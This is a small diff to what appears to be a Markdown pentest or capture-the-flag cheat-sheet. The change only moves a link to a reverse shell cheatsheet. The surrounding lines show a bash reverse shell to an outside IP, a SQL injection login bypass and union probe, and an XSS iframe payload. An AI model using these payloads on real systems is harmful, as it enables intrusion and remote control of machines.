@@ -45,6 +45,8 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 ### Payload
 
+- All payloads --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
 - `' or 1=1- -` --> Bypass authentification web
 	- [Payload](https://github.com/payloadbox/sql-injection-payload-list)
 	- Mary' union select 1,2,3,4,5,@@version#
@@ -62,9 +64,7 @@ CALL SHELLEXEC('bash -i >& /dev/tcp/10.10.10.10/1234 0>&1')
 
 - [Xss Payload](https://github.com/payloadbox/xss-payload-list) --> Payload XSS
 	- `<iframe src="javascript:alert('xss')">`
-
-- All payloads --> https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
-
+ 
 ---
  
 ## BruteForce
